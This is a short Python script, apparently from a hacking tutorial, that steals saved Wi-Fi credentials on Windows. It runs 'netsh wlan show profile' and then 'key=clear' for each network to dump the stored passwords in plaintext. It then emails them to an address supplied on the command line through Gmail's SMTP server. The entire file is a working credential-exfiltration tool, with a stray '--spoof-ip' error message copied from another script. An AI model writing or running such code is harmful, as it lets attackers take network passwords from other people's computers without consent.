#!/usr/bin/env python

import subprocess, smtplib, re
import argparse

# Create function to pass arguments while calling the program
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--user-name", dest="username", help="Set GMail Username")
    parser.add_argument("-p", "--password", dest="password", help="Set GMail Password")
    parser.add_argument("-e", "--to-email", dest="email", help="Set email address to mail report to")
    options = parser.parse_args()
    if not options.username:
        parser.error("[-] Please specify a gmail username using -u or --user-name options, use --help for more info.")
    elif not options.password:
        parser.error("[-] Please specify a gmail password using -p or --password options, use --help for more info.")
    elif not options.email:
        parser.error("[-] Please specify email address for report using -s or --spoof-ip options, use --help for more info.")
    return options


def send_mail(username, password, email, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(username, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True)
network_names = re.findall("(?:Profile\s*:\s)(.*)", str(networks))

message = ""
for network in network_names:
    message += subprocess.check_output(command + " " + network + " key=clear", shell=True)


options = get_arguments()
send_mail(options.username, options.password, options.email, message)
